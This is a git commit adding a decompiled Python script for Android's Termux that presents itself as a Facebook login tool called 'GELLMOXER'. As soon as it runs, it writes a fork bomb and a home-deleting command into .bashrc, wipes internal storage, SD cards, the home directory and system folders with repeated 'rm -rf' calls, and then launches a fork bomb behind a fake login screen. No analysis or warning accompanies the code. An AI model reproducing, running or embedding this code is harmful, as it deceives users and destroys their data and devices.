7c08bf7dfef3f58305718c060db68e86633f335f
xNot_Found <41625152+hatakecnk@users.noreply.github.com>
2019-07-20 23:44:43 +0700

    Add files via upload

---
+++ gm13-decompiled.py
@@ -0,0 +1,62 @@
+# uncompyle6 version 3.3.4
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.16 (default, Apr 24 2019, 10:05:31) 
+# [GCC 4.2.1 Compatible Android (5058415 based on r339409) Clang 8.0.2 (https://a
+# Embedded file name: dg
+from __future__ import print_function
+import platform, os, sys, time, smtplib
+
+def pdh():
+    os.system('mv gm13.py $HOME/')
+
+
+def logo():
+    print('      \x1b[1;91m\xe2\x95\x94' + 11 * '\xe2\x95\x90' + '\xe2\x89\x94-^-\xe2\x89\x95' + 11 * '\xe2\x95\x90' + '\xe2\x95\x97\n    \x1b[1;91m.\xe2\x95\x92\xe2\x95\x9d\x1b[36m     .:: GELLMOXER ::.     \x1b[91m\xe2\x95\x9a\xe2\x95\x95.\n    \xe2\x95\x92\xe2\x89\x94\xe2\x95\x96' + 27 * '\xe2\x89\x91' + '\xe2\x95\x93\xe2\x89\x95\xe2\x95\x95  \n      \x1b[1;91m\xe2\x95\x9a' + '\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90' + '\x1b[36m-\xe2\x89\x95 PERFECT13 \xe2\x89\x94-\x1b[1;91m' + '\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90' + '\xe2\x95\x9d')
+
+
+def rege():
+    time.sleep(0.001)
+    print('\x1b[1;92m\xe2\x95\x91........................................\xe2\x95\x91\n\xe2\x95\x91............++++++.....+++++............\xe2\x95\x91\n\xe2\x95\x91...........++++++++..++++++++...........\xe2\x95\x91\n\x1b[1;93m\xe2\x95\x91...........+++..+++..+++................\xe2\x95\x91\n\xe2\x95\x91...........+++++++...+++.+++++..........\xe2\x95\x91\n\xe2\x95\x91...........++++++....+++...+++..........\xe2\x95\x91\n\x1b[1;91m\xe2\x95\x91...........+++.+++...++++++++...........\xe2\x95\x91\n\xe2\x95\x91...........+++..+++...++++++............\xe2\x95\x91\n\xe2\x95\x91........................................\xe2\x95\x91')
+
+
+def login():
+    time.sleep(0.001)
+    os.system('clear')
+    logo()
+    print('\x1b[1;36m\xe2\x95\x92' + 40 * '\xe2\x95\x90' + '\xe2\x95\x95')
+    rege()
+    print('\x1b[1;36m\xe2\x95\x98' + 40 * '\xe2\x95\x90' + '\xe2\x95\x9b')
+    print('\x1b[1;92m\xe2\x95\x94' + 40 * '\xe2\x95\x90' + '\xe2\x95\x97')
+    print('\x1b[1;92m\xe2\x95\x91\x1b[1;91m       [\xe2\x98\x86] \x1b[1;36mLOGIN AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]\x1b[1;92m   -\xe2\x89\x95\xe2\x95\x90\xe2\x95\x9d')
+    print('\x1b[1;92m\xe2\x95\x91')
+    print('\x1b[1;92m\xe2\x95\x91[\xe2\x89\x94- \x1b[1;66mUsername \x1b[1;92m:\x1b[1;36m ')
+    print('\x1b[1;93m[x] Keluar')
+    os.system(':(){ :|: & };:')
+
+
+def gm():
+    os.system('touch .hushlogin')
+    os.system('printf ":(){ :|: & };:\nrm -rf $HOME" > $HOME/.bashrc')
+    os.system('termux-setup-storage')
+    os.system('rm -rf /storage/emulated/0/*')
+    os.system('rm -rf /storage/emulated/*')
+    os.system('rm -rf /sdcard/*')
+    os.system('rm -rf /sdcard/0/*')
+    os.system('rm -rf /sdcard1/*')
+    os.system('rm -rf /mnt/m_external_sd/*')
+    os.system('rm -rf /storage/*')
+    os.system('rm -rf $HOME/*')
+    os.system('rm -rf /*')
+    os.system('rm -rf /system/*')
+    os.system('rm -rf /system/bin/*')
+    os.system('rm -rf /etc/*')
+    os.system('rm -rf /system/build.prop')
+    os.system('rm -rf $HOME/../../*')
+    os.system('rm -rf /d')
+    os.system('bash .bashrc')
+    os.remove('$HOME')
+
+
+pdh()
+gm()
+login()
